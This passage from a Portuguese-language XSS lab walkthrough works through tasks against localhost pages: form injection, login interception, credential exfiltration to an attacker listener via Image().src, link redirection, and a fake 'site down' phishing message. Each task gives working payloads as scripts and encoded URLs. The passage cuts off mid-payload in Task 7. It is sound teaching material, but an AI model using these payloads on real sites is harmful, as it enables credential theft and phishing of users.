	<span class="nx">input</span><span class="p">.</span><span class="nf">setAttribute</span><span class="p">(</span><span class="dl">"</span><span class="s2">class</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">input-block-level</span><span class="dl">"</span><span class="p">);</span>
	<span class="nx">input</span><span class="p">.</span><span class="nf">setAttribute</span><span class="p">(</span><span class="dl">"</span><span class="s2">placeholder</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">Registration Number</span><span class="dl">"</span><span class="p">);</span>
	<span class="nx">input</span><span class="p">.</span><span class="nf">setAttribute</span><span class="p">(</span><span class="dl">"</span><span class="s2">name</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">regnum</span><span class="dl">"</span><span class="p">);</span>
	<span class="kd">var</span> <span class="nx">prev</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">elements</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
	<span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nf">insertBefore</span><span class="p">(</span><span class="nx">input</span><span class="p">,</span> <span class="nx">prev</span><span class="p">);</span>
<span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><p>Convertendo para <em>URL Encode</em>:</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>%3Cscript%3E%0A%09var%20input%20%3D%20document.createElement%28%22input%22%29%3B%0A%09input.setAttribute%28%22type%22%2C%20%22text%22%29%3B%0A%09input.setAttribute%28%22class%22%2C%20%22input-block-level%22%29%3B%0A%09input.setAttribute%28%22placeholder%22%2C%20%22Registration%20Number%22%29%3B%0A%09input.setAttribute%28%22name%22%2C%20%22regnum%22%29%3B%0A%09var%20prev%20%3D%20document.forms%5B0%5D.elements%5B0%5D%3B%0A%09document.forms%5B0%5D.insertBefore%28input%2C%20prev%29%3B%0A%3C%2Fscript%3E
</pre></table></code></div></div><p>Gerando a seguinte URL:</p><ul><li><a href="http://localhost/02/?search=%3Cscript%3E%0A%09var%20input%20%3D%20document.createElement%28%22input%22%29%3B%0A%09input.setAttribute%28%22type%22%2C%20%22text%22%29%3B%0A%09input.setAttribute%28%22class%22%2C%20%22input-block-level%22%29%3B%0A%09input.setAttribute%28%22placeholder%22%2C%20%22Registration%20Number%22%29%3B%0A%09input.setAttribute%28%22name%22%2C%20%22regnum%22%29%3B%0A%09var%20prev%20%3D%20document.forms%5B0%5D.elements%5B0%5D%3B%0A%09document.forms%5B0%5D.insertBefore%28input%2C%20prev%29%3B%0A%3C%2Fscript%3E">http://localhost/02/?search=%3Cscript%3E%0A%09var%20input%20%3D%20document.createElement%28%22input%22%29%3B%0A%09input.setAttribute%28%22type%22%2C%20%22text%22%29%3B%0A%09input.setAttribute%28%22class%22%2C%20%22input-block-level%22%29%3B%0A%09input.setAttribute%28%22placeholder%22%2C%20%22Registration%20Number%22%29%3B%0A%09input.setAttribute%28%22name%22%2C%20%22regnum%22%29%3B%0A%09var%20prev%20%3D%20document.forms%5B0%5D.elements%5B0%5D%3B%0A%09document.forms%5B0%5D.insertBefore%28input%2C%20prev%29%3B%0A%3C%2Fscript%3E</a></ul><p><img data-proofer-ignore data-src="/img/posts/2023-06-21-beyond-the-alert-8.png" alt="Form" /></p><h4 id="referências-1">Referências</h4><ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Document/createElement">https://developer.mozilla.org/en-US/docs/Web/API/Document/createElement</a><li><a href="https://developer.mozilla.org/en-US/docs/Learn/Forms">https://developer.mozilla.org/en-US/docs/Learn/Forms</a><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/HTMLFormElement/elements">https://developer.mozilla.org/en-US/docs/Web/API/HTMLFormElement/elements</a><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Element/setAttribute">https://developer.mozilla.org/en-US/docs/Web/API/Element/setAttribute</a></ul><h3 id="task-3---intercept-form-submit"><em>Task 3 - Intercept Form Submit</em></h3><p><img data-proofer-ignore data-src="/img/posts/2023-06-21-beyond-the-alert-10.png" alt="Task 3" /></p><h4 id="objetivo-3">Objetivo</h4><p>O objetivo desta <em>task</em> é interceptar a submissão do formulário ao efetuar <em>login</em>, a princípio esta <em>task</em> pede simplesmente para imprimir um alerta na tela com o usuário e senha ao submeter o formulário.</p><h4 id="conhecimento-base-2">Conhecimento Base</h4><p><em>Event listeners</em> em JavaScript são funções chamadas em resposta a um evento específico que ocorre em um elemento da página. Esses eventos podem ser uma ampla variedade de ações do usuário, como cliques do mouse, movimentos do mouse, pressionamentos de teclas, eventos de foco, eventos de envio de formulário e muitos outros.</p><p>É possível programar uma ação que seja ativada por um <em>event listener</em> e execute uma função ou script.</p><h4 id="exploração-2">Exploração</h4><p>Uma vez que conseguimos selecionar determinados elementos do documento HTML e obter seus valores, é possível criar uma função em JavaScript que seja acionada por um <em>event listener</em> relacionado ao evento <em>submit</em> de um formulário.</p><div lang="html" class="language-html highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="nt">&lt;script&gt;</span>

	<span class="kd">function</span> <span class="nf">InterceptForm</span><span class="p">()</span> <span class="p">{</span>
		<span class="kd">var</span> <span class="nx">username</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">elements</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">value</span><span class="p">;</span>
		<span class="kd">var</span> <span class="nx">password</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">elements</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="nx">value</span><span class="p">;</span>
		<span class="nf">alert</span><span class="p">(</span><span class="nx">username</span> <span class="o">+</span> <span class="dl">'</span><span class="s1"> : </span><span class="dl">'</span> <span class="o">+</span> <span class="nx">password</span><span class="p">);</span>
	<span class="p">}</span>
	
	<span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">onsubmit</span> <span class="o">=</span> <span class="nx">InterceptForm</span><span class="p">;</span>
<span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><p>Convertendo para <em>URL Encode</em>:</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>%3Cscript%3E%0A%0A%09function%20InterceptForm%28%29%20%7B%0A%09%09var%20username%20%3D%20document.forms%5B0%5D.elements%5B0%5D.value%3B%0A%09%09var%20password%20%3D%20document.forms%5B0%5D.elements%5B1%5D.value%3B%0A%09%09alert%28username%20%2B%20%27%20%3A%20%27%20%2B%20password%29%3B%0A%09%7D%0A%09%0A%09document.forms%5B0%5D.onsubmit%20%3D%20InterceptForm%3B%0A%3C%2Fscript%3E
</pre></table></code></div></div><p>Gerando a seguinte URL:</p><ul><li><a href="http://localhost/03/?search=%3Cscript%3E%0A%0A%09function%20InterceptForm%28%29%20%7B%0A%09%09var%20username%20%3D%20document.forms%5B0%5D.elements%5B0%5D.value%3B%0A%09%09var%20password%20%3D%20document.forms%5B0%5D.elements%5B1%5D.value%3B%0A%09%09alert%28username%20%2B%20%27%20%3A%20%27%20%2B%20password%29%3B%0A%09%7D%0A%09%0A%09document.forms%5B0%5D.onsubmit%20%3D%20InterceptForm%3B%0A%3C%2Fscript%3E">http://localhost/03/?search=%3Cscript%3E%0A%0A%09function%20InterceptForm%28%29%20%7B%0A%09%09var%20username%20%3D%20document.forms%5B0%5D.elements%5B0%5D.value%3B%0A%09%09var%20password%20%3D%20document.forms%5B0%5D.elements%5B1%5D.value%3B%0A%09%09alert%28username%20%2B%20%27%20%3A%20%27%20%2B%20password%29%3B%0A%09%7D%0A%09%0A%09document.forms%5B0%5D.onsubmit%20%3D%20InterceptForm%3B%0A%3C%2Fscript%3E</a></ul><p>Ao acessar a página, nenhuma alteração é visível, porém, ao preencher os campos de usuário e senha, e submeter o formulário, o alerta é impresso com os dados preenchidos.</p><p><img data-proofer-ignore data-src="/img/posts/2023-06-21-beyond-the-alert-11.png" alt="Conclusão" /></p><h4 id="referências-2">Referências</h4><ul><li><a href="https://developer.mozilla.org/en-US/docs/Learn/Forms">https://developer.mozilla.org/en-US/docs/Learn/Forms</a><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/HTMLFormElement/elements">https://developer.mozilla.org/en-US/docs/Web/API/HTMLFormElement/elements</a><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/EventTarget/addEventListener">https://developer.mozilla.org/en-US/docs/Web/API/EventTarget/addEventListener</a></ul><h3 id="task-4---stealing-form-submissions"><em>Task 4 - Stealing Form Submissions</em></h3><p><img data-proofer-ignore data-src="/img/posts/2023-06-21-beyond-the-alert-12.png" alt="Task 4" /></p><h4 id="objetivo-4">Objetivo</h4><p>O objetivo desta <em>task</em> é interceptar a submissão do formulário ao efetuar <em>login</em>, porém, diferente da <em>task 3</em>, desta vez é preciso exfiltrar estas informações, as enviando para uma máquina sob controle do atacante.</p><h4 id="conhecimento-base-3">Conhecimento Base</h4><p>No JavaScript, assim como outras linguagens, existem os <span style="color: #1cce43"><b><i>constructors</i></b></span>.</p><p>Um “<em>constructor</em>” em JavaScript é um método especial usado parara criar e inicializar um objeto quando você usa a declaração <code class="language-plaintext highlighter-rouge">new</code>. Todos os objetos em JavaScript (com exceção dos objetos com um protótipo <code class="language-plaintext highlighter-rouge">null</code> ou <code class="language-plaintext highlighter-rouge">undefined</code>) têm um construtor.</p><p>Alguns exemplos de <em>constructors</em> são:</p><ul><li><code class="language-plaintext highlighter-rouge">Image()</code>: cria um novo objeto de imagem.<li><code class="language-plaintext highlighter-rouge">Object()</code>: cria um novo objeto vazio.<li><code class="language-plaintext highlighter-rouge">Array()</code>: cria um novo <em>array</em> vazio.<li><code class="language-plaintext highlighter-rouge">Function()</code>: cria uma nova função.<li><code class="language-plaintext highlighter-rouge">Date()</code>: cria um novo objeto de data e hora.<li><code class="language-plaintext highlighter-rouge">RegExp()</code>: cria um novo objeto de expressão regular.</ul><p>O <em>constructor</em> <code class="language-plaintext highlighter-rouge">Image()</code> cria e retorna um novo objeto <code class="language-plaintext highlighter-rouge">HTMLImageElement</code> representando um elemento HTML que não está anexado a nenhuma árvore DOM. Ele aceita parâmetros opcionais de largura e altura. Quando chamado sem parâmetros, o <code class="language-plaintext highlighter-rouge">new Image()</code> é equivalente a chamar <code class="language-plaintext highlighter-rouge">document.createElement('img')</code>.</p><p>Um elemento HTML do tipo imagem precisa necessariamente do atributo <code class="language-plaintext highlighter-rouge">src</code> que indica o <strong>endereço</strong> da imagem a ser carregada, portanto, o <em>constructor</em>, <code class="language-plaintext highlighter-rouge">Image()</code> também precisa, porém, como é um elemento JavaScript, pode ser preenchido com variáveis.</p><p>Quando um elemento do tipo <code class="language-plaintext highlighter-rouge">img</code> existe em um documento, seja diretamente em código HTML ou inserido via JavaScript, seu atributo <code class="language-plaintext highlighter-rouge">src</code> é invocado automaticamente toda vez que a página é invocada, fazendo uma requisição para o endereço configurado.</p><h4 id="exploração-3">Exploração</h4><p>Esta exploração pode seguir, em sua maioria, como na <em>task 3</em>, porém ao invés de invocar um <code class="language-plaintext highlighter-rouge">alert()</code> com os dados obtidos, podemos iniciar um <em>constructor</em> do tipo <code class="language-plaintext highlighter-rouge">Image()</code> e em seu atributo <code class="language-plaintext highlighter-rouge">src</code> apontar para um endereço controlável pelo atacante, concatenado com as variáveis de usuário e senha obtidos. Ficando da seguinte forma:</p><div lang="html" class="language-html highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="nt">&lt;script&gt;</span>

	<span class="kd">function</span> <span class="nf">InterceptForm</span><span class="p">()</span> <span class="p">{</span>
		<span class="kd">var</span> <span class="nx">username</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">elements</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">value</span><span class="p">;</span>
		<span class="kd">var</span> <span class="nx">password</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">elements</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="nx">value</span><span class="p">;</span>
		<span class="k">new</span> <span class="nc">Image</span><span class="p">().</span><span class="nx">src</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://0.0.0.0:8080/?user=</span><span class="dl">"</span><span class="o">+</span><span class="nx">username</span><span class="o">+</span><span class="dl">"</span><span class="s2">&amp;pass=</span><span class="dl">"</span><span class="o">+</span><span class="nx">password</span><span class="p">;</span>
	<span class="p">}</span>
	
	<span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">onsubmit</span> <span class="o">=</span> <span class="nx">InterceptForm</span><span class="p">;</span>
<span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><p>Convertendo para <em>URL Encode</em>:</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>%3Cscript%3E%0A%0A%09function%20InterceptForm%28%29%20%7B%0A%09%09var%20username%20%3D%20document.forms%5B0%5D.elements%5B0%5D.value%3B%0A%09%09var%20password%20%3D%20document.forms%5B0%5D.elements%5B1%5D.value%3B%0A%09%09new%20Image%28%29.src%20%3D%20%22http%3A%2F%2F0.0.0.0%3A8080%2F%3Fuser%3D%22%2Busername%2B%22%26pass%3D%22%2Bpassword%3B%0A%09%7D%0A%09%0A%09document.forms%5B0%5D.onsubmit%20%3D%20InterceptForm%3B%0A%3C%2Fscript%3E
</pre></table></code></div></div><p>Gerando a seguinte URL:</p><ul><li><a href="http://localhost/04/?search=%3Cscript%3E%0A%0A%09function%20InterceptForm%28%29%20%7B%0A%09%09var%20username%20%3D%20document.forms%5B0%5D.elements%5B0%5D.value%3B%0A%09%09var%20password%20%3D%20document.forms%5B0%5D.elements%5B1%5D.value%3B%0A%09%09new%20Image%28%29.src%20%3D%20%22http%3A%2F%2F0.0.0.0%3A8080%2F%3Fuser%3D%22%2Busername%2B%22%26pass%3D%22%2Bpassword%3B%0A%09%7D%0A%09%0A%09document.forms%5B0%5D.onsubmit%20%3D%20InterceptForm%3B%0A%3C%2Fscript%3E">http://localhost/04/?search=%3Cscript%3E%0A%0A%09function%20InterceptForm%28%29%20%7B%0A%09%09var%20username%20%3D%20document.forms%5B0%5D.elements%5B0%5D.value%3B%0A%09%09var%20password%20%3D%20document.forms%5B0%5D.elements%5B1%5D.value%3B%0A%09%09new%20Image%28%29.src%20%3D%20%22http%3A%2F%2F0.0.0.0%3A8080%2F%3Fuser%3D%22%2Busername%2B%22%26pass%3D%22%2Bpassword%3B%0A%09%7D%0A%09%0A%09document.forms%5B0%5D.onsubmit%20%3D%20InterceptForm%3B%0A%3C%2Fscript%3E</a></ul><p>Podemos iniciar um <em>Python server</em> na porta 8080 configurada para ouvir a requisição feita.</p><p><img data-proofer-ignore data-src="/img/posts/2023-06-21-beyond-the-alert-13.png" alt="Servidor Python ouvindo" /></p><p>Ao acessar a página, nenhuma alteração é visível, porém, ao preencher os campos de usuário e senha, e submeter o formulário, o <em>constructor</em> <code class="language-plaintext highlighter-rouge">Image()</code> tentará carregar o endereço da imagem, que está apontando para o <em>Python server</em> resultando na exfiltração dos dados do formulário.</p><p><img data-proofer-ignore data-src="/img/posts/2023-06-21-beyond-the-alert-14.png" alt="Dados exfiltrados" /></p><h4 id="referências-3">Referências</h4><ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement/Image">https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement/Image</a></ul><h3 id="task-5---redirecting-all-links-in-the-page"><em>Task 5 - Redirecting All Links in the Page</em></h3><p><img data-proofer-ignore data-src="/img/posts/2023-06-21-beyond-the-alert-15.png" alt="Task 5" /></p><h4 id="objetivo-5">Objetivo</h4><p>O objetivo desta <em>task</em> é alterar o destino de todos os <em>links</em> da página para “https://h41stur.com” (pode alterar para qualquer lugar, desde que altere).</p><h4 id="conhecimento-base-4">Conhecimento Base</h4><p>Já vimos em <em>tasks</em> anteriores que o método <code class="language-plaintext highlighter-rouge">getElementsByTagName()</code> filtra todos os elementos de um determinado nome de <em>tag</em> e os insere em um <em>array</em>.</p><p>Sabendo que um <em>link</em> HTML é criado pela <em>tag</em> <code class="language-plaintext highlighter-rouge">&lt;a&gt;</code> e obrigatoriamente precisa do atributo <code class="language-plaintext highlighter-rouge">href</code> que aponta para o endereço do <em>link</em>, podemos criar um <em>array</em> com todos os links da página, e iterar sobre ele com um laço <code class="language-plaintext highlighter-rouge">for</code>.</p><h4 id="exploração-4">Exploração</h4><p>Montando o script com os elementos.</p><div lang="html" class="language-html highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="nt">&lt;script&gt;</span>
	<span class="kd">var</span> <span class="nx">links</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementsByTagName</span><span class="p">(</span><span class="dl">"</span><span class="s2">a</span><span class="dl">"</span><span class="p">);</span>
	<span class="k">for</span> <span class="p">(</span><span class="nx">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">links</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">){</span>
		<span class="nx">links</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">href</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">https://h41stur.com</span><span class="dl">"</span><span class="p">;</span>
	<span class="p">}</span>
<span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><p>Convertendo para <em>URL Encode</em>:</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>%3Cscript%3E%0A%09var%20links%20%3D%20document.getElementsByTagName%28%22a%22%29%3B%0A%09for%20%28i%3D0%3B%20i%20%3C%20links.length%3B%20i%2B%2B%29%7B%0A%09%09links%5Bi%5D.href%20%3D%20%22https%3A%2F%2Fh41stur.com%22%3B%0A%09%7D%0A%3C%2Fscript%3E
</pre></table></code></div></div><p>Gerando a seguinte URL:</p><ul><li><a href="http://localhost/05/?search=%3Cscript%3E%0A%09var%20links%20%3D%20document.getElementsByTagName%28%22a%22%29%3B%0A%09for%20%28i%3D0%3B%20i%20%3C%20links.length%3B%20i%2B%2B%29%7B%0A%09%09links%5Bi%5D.href%20%3D%20%22https%3A%2F%2Fh41stur.com%22%3B%0A%09%7D%0A%3C%2Fscript%3E">http://localhost/05/?search=%3Cscript%3E%0A%09var%20links%20%3D%20document.getElementsByTagName%28%22a%22%29%3B%0A%09for%20%28i%3D0%3B%20i%20%3C%20links.length%3B%20i%2B%2B%29%7B%0A%09%09links%5Bi%5D.href%20%3D%20%22https%3A%2F%2Fh41stur.com%22%3B%0A%09%7D%0A%3C%2Fscript%3E</a></ul><p>Todos os <em>links</em> da página apontarão para o endereço do script.</p><h4 id="referências-4">Referências</h4><ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Document/getElementsByTagName">https://developer.mozilla.org/en-US/docs/Web/API/Document/getElementsByTagName</a></ul><h3 id="task-6---changing-content-to-social-engineering"><em>Task 6 - Changing Content to Social Engineering</em></h3><p><img data-proofer-ignore data-src="/img/posts/2023-06-21-beyond-the-alert-16.png" alt="Task 6" /></p><h4 id="objetivo-6">Objetivo</h4><p>O objetivo desta <em>task</em> é alterar o <em>layout</em> da página, ao substituir o formulário de <em>login</em> por uma mensagem de aviso que redirecione o usuário para outro lugar com objetivos de engenharia social.</p><h4 id="conhecimento-base-5">Conhecimento Base</h4><p>A propriedade <code class="language-plaintext highlighter-rouge">parentNode</code> em JavaScript é uma propriedade que retorna o nó pai de um elemento específico no <em>Document Object Model</em> (DOM). O <strong>DOM</strong> é uma representação estruturada de um documento HTML ou XML, aonde cada parte do documento (como elementos, atributos, texto, etc.) é representada como um “nó” em uma estrutura de árvore.</p><p>Por exemplo, se você tem um elemento de parágrafo (<code class="language-plaintext highlighter-rouge">&lt;p&gt;</code>) dentro de um elemento <code class="language-plaintext highlighter-rouge">&lt;div&gt;</code>, o <code class="language-plaintext highlighter-rouge">parentNode</code> do parágrafo seria o <code class="language-plaintext highlighter-rouge">&lt;div&gt;</code>.</p><div lang="html" class="language-html highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"minhaDiv"</span><span class="nt">&gt;</span> <span class="c">&lt;!-- Nó pai --&gt;</span>
  <span class="nt">&lt;p</span> <span class="na">id=</span><span class="s">"meuParagrafo"</span><span class="nt">&gt;</span>Olá, mundo!<span class="nt">&lt;/p&gt;</span> <span class="c">&lt;!-- Nó filho --&gt;</span>
<span class="nt">&lt;/div&gt;</span>
</pre></table></code></div></div><p>O método <code class="language-plaintext highlighter-rouge">appendChild()</code> em JavaScript é usado para adicionar um novo nó ao final da lista de filhos de um nó pai especificado no <em>Document Object Model</em> (DOM).</p><p>O método <code class="language-plaintext highlighter-rouge">removeChild()</code> em JavaScript é usado para remover um nó filho de um nó pai específico na estrutura do <em>Document Object Model</em> (DOM). Essencialmente, este método permite que você exclua um elemento existente de uma página web.</p><p>O método <code class="language-plaintext highlighter-rouge">removeChild()</code> requer um argumento: o nó que você deseja remover. Ele deve ser um nó filho do objeto do qual você está chamando o método.</p><h4 id="exploração-5">Exploração</h4><p>Unindo o que já foi explorado anteriormente com as propriedades de nó, podemos criar um novo elemento que contenha nossa mensagem já importanto a classe que o formate adequadamente, inseri-la dentro do HTML e em seguida, excluir o elemento formulário.</p><div lang="html" class="language-html highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="nt">&lt;script&gt;</span>
	<span class="kd">var</span> <span class="nx">input</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">createElement</span><span class="p">(</span><span class="dl">"</span><span class="s2">h2</span><span class="dl">"</span><span class="p">);</span>
	<span class="nx">input</span><span class="p">.</span><span class="nf">setAttribute</span><span class="p">(</span><span class="dl">"</span><span class="s2">class</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">h41stur</span><span class="dl">"</span><span class="p">);</span>
	<span class="nx">input</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">Site fora do ar! Por favor vá para https://h41stur.com</span><span class="dl">"</span><span class="p">;</span>
	<span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">parentNode</span><span class="p">.</span><span class="nf">appendChild</span><span class="p">(</span><span class="nx">input</span><span class="p">);</span>
	<span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">parentNode</span><span class="p">.</span><span class="nf">removeChild</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>	
<span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><p>Convertendo para <em>URL Encode</em>:</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>%3Cscript%3E%0A%09var%20input%20%3D%20document.createElement%28%22h2%22%29%3B%0A%09input.setAttribute%28%22class%22%2C%20%22h41stur%22%29%3B%0A%09input.innerHTML%20%3D%20%22Site%20fora%20do%20ar%21%20Por%20favor%20v%C3%A1%20para%20https%3A%2F%2Fh41stur.com%22%3B%0A%09document.forms%5B0%5D.parentNode.appendChild%28input%29%3B%0A%09document.forms%5B0%5D.parentNode.removeChild%28document.forms%5B0%5D%29%3B%09%0A%3C%2Fscript%3E
</pre></table></code></div></div><p>Gerando a seguinte URL:</p><ul><li><a href="http://localhost/06/?search=%3Cscript%3E%0A%09var%20input%20%3D%20document.createElement%28%22h2%22%29%3B%0A%09input.setAttribute%28%22class%22%2C%20%22h41stur%22%29%3B%0A%09input.innerHTML%20%3D%20%22Site%20fora%20do%20ar%21%20Por%20favor%20v%C3%A1%20para%20https%3A%2F%2Fh41stur.com%22%3B%0A%09document.forms%5B0%5D.parentNode.appendChild%28input%29%3B%0A%09document.forms%5B0%5D.parentNode.removeChild%28document.forms%5B0%5D%29%3B%09%0A%3C%2Fscript%3E">http://localhost/06/?search=%3Cscript%3E%0A%09var%20input%20%3D%20document.createElement%28%22h2%22%29%3B%0A%09input.setAttribute%28%22class%22%2C%20%22h41stur%22%29%3B%0A%09input.innerHTML%20%3D%20%22Site%20fora%20do%20ar%21%20Por%20favor%20v%C3%A1%20para%20https%3A%2F%2Fh41stur.com%22%3B%0A%09document.forms%5B0%5D.parentNode.appendChild%28input%29%3B%0A%09document.forms%5B0%5D.parentNode.removeChild%28document.forms%5B0%5D%29%3B%09%0A%3C%2Fscript%3E</a></ul><p><img data-proofer-ignore data-src="/img/posts/2023-06-21-beyond-the-alert-17.png" alt="Resultado" /></p><h4 id="referências-5">Referências</h4><ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Node/parentNode">https://developer.mozilla.org/en-US/docs/Web/API/Node/parentNode</a><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Node/appendChild">https://developer.mozilla.org/en-US/docs/Web/API/Node/appendChild</a><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Node/removeChild">https://developer.mozilla.org/en-US/docs/Web/API/Node/removeChild</a></ul><h3 id="task-7---abusing-event-listeners"><em>Task 7 - Abusing Event Listeners</em></h3><p><img data-proofer-ignore data-src="/img/posts/2023-06-21-beyond-the-alert-18.png" alt="Task 7" /></p><h4 id="objetivo-7">Objetivo</h4><p>O objetivo desta <em>task</em> é alterar abusar de um <em>event listener</em> para imprimir um alerta com a senha preenchida no campo.</p><h4 id="conhecimento-base-6">Conhecimento Base</h4><p>Conforme explorado anteriormente, os <em>event listeners</em> são funções chamadas em resposta a um evento específico que ocorre em um elemento. Existem uma infinidade de <em>event listeners</em> que podem ser utilizados em vários contextos diferentes.</p><h4 id="exploração-6">Exploração</h4><p>A primeira coisa a se observar, é que após enviar uma requisição de <em>login</em>, duas coisas acontecem:</p><ol><li>A URL é preenchida com os dados do formulário (algo inconcebível no que diz respeito a segurança, mas considere um exemplo).<li>O campo <code class="language-plaintext highlighter-rouge">email</code> do formulário fica com ser <code class="language-plaintext highlighter-rouge">value</code> preenchido com o e-mail informado.</ol><p><img data-proofer-ignore data-src="/img/posts/2023-06-21-beyond-the-alert-19.png" alt="Campo preenchido" /></p><p>Isso significa que, se o campo e-mail não tiver um tratamento de entrada, é possível preenchê-lo com aspas, para sair do contexto <code class="language-plaintext highlighter-rouge">value</code> e a partir daí entrar nas propriedades do campo <code class="language-plaintext highlighter-rouge">input</code>.</p><p>Por exemplo, se pegarmos a seguinte <em>string</em>:</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>" teste="h41stur
</pre></table></code></div></div><p>Encodá-lo em URL encode:</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>%22%20teste%3D%22h41stur
</pre></table></code></div></div><p>E injetá-lo na URL no parâmetro <code class="language-plaintext highlighter-rouge">email</code> com a seguinte URL:</p><ul><li><a href="http://localhost/07/?email=%22%20teste%3D%22h41stur&amp;password=">http://localhost/07/?email=%22%20teste%3D%22h41stur&amp;password=</a></ul><p>Ao checarmos o código HTML da página, veremos que saímos do escopo <code class="language-plaintext highlighter-rouge">value</code> e criamos uma nova propriedade.</p><p><img data-proofer-ignore data-src="/img/posts/2023-06-21-beyond-the-alert-20.png" alt="Contexto alterado" /></p><p>Sabendo desta falha, podemos criar um <em>event listener</em> dentro de um <em>event handler attribute</em> para ser injetado no elemento <code class="language-plaintext highlighter-rouge">input</code> da seguinte forma:</p><div lang="javascript" class="language-javascript highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="dl">"</span><span class="s2"> onmouseover=</span><span class="dl">"</span>
